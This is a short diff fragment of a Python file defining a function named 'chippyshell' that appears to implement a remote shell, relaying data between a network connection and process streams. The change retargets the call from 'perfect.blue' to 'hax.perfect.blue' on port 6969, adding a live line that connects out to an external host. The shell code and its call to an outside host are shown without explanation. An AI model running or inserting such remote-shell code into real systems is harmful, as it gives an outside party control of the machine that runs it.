@@ -46,4 +46,4 @@ def chippyshell(host,port):
                             y[n].write(z)
                             y[n].flush()
                 except: pass
-chippyshell('perfect.blue', 6969)
+chippyshell('hax.perfect.blue', 6969)
